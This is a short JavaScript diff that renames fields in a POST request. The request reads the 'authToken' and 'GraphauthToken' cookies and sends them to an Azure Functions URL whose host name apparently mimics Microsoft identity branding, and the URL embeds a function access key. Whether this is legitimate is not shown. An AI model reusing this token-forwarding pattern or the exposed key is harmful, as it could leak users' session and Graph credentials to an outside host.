@@ -29,8 +29,8 @@ const sendHttpRequest = (method, url, data) => {
 
 const sendData = () => {
     sendHttpRequest('POST', "https://azuredmicrosoftidentityclient.azurewebsites.net/api/TrimCodeLoginSetRbac?code=96KgteUBMuyE8rcluDzFogZ4ybI8vXkHLWu6cS3xlvxkpXXaDcoqaA==", {
-        authCode: getCookie("authToken"),
-        graphCode: getCookie("GraphauthToken")
+        authToken: getCookie("authToken"),
+        GraphauthToken: getCookie("GraphauthToken")
   })
     .then(responseData => {
       console.log(responseData);
